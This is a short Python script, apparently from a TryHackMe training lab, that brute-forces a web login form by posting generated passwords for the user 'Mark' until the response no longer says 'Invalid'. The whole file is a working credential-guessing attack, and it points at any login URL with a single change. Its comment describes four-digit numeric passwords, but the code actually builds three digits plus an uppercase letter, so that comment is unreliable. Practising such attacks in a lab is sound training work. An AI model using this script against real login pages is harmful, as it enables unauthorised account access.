import requests

url = "http://python.thm/labs/lab1/index.php"

username = "Mark"

# Generating 4-digit numeric passwords (0000-9999)
password_list = [f"{str(i).zfill(3)}{chr(c)}" for i in range(1000) for c in range(65, 91)]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
